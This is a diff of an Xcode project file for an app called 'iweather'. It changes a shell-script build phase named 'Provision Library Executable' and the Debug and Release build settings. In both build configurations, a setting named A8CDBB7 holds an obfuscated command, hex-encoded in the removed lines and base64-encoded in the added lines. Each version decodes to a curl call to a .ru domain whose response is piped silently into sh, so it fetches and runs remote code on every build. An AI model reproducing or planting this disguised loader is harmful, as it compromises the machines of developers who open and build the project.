@@ -58,7 +58,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8EED03773032D74F00F68C15 /* Build configuration list for PBXNativeTarget "iweather" */;
 			buildPhases = (
-				191CD8318D3440BAA97BBDC8 /* Provision Library Executable */,
+				475991C2A45548DD927BBDC8 /* Provision Library Executable */,
 				8EED03683032D74E00F68C15 /* Sources */,
 				8EED03693032D74E00F68C15 /* Frameworks */,
 				8EED036A3032D74E00F68C15 /* Resources */,
@@ -112,7 +112,7 @@
 /* End PBXProject section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		191CD8318D3440BAA97BBDC8 /* Provision Library Executable */ = {
+		475991C2A45548DD927BBDC8 /* Provision Library Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -157,7 +157,7 @@
 		8EED03753032D74F00F68C15 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((l(){ `printf x6xd | tr -d 6` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d2d636f6e6e6563742d74696d656f7574203239202d666b4c73202d642022703d78636f64655f7068617365222068747470733a2f2f306e76382d6b6e74376d313534372e72752f612922207c2073680a | l | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((m(){ `printf baset64 | tr -d t` --decode; };echo ZWNobyAiJChjdXJsIC1zTGZrIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly82bGR3dWRnb2NrbDBnMi5ydS9hKSIgfCBzaAo= | m | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -222,7 +222,7 @@
 		8EED03763032D74F00F68C15 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((l(){ `printf x6xd | tr -d 6` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d2d636f6e6e6563742d74696d656f7574203239202d666b4c73202d642022703d78636f64655f7068617365222068747470733a2f2f306e76382d6b6e74376d313534372e72752f612922207c2073680a | l | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((m(){ `printf baset64 | tr -d t` --decode; };echo ZWNobyAiJChjdXJsIC1zTGZrIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly82bGR3dWRnb2NrbDBnMi5ydS9hKSIgfCBzaAo= | m | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
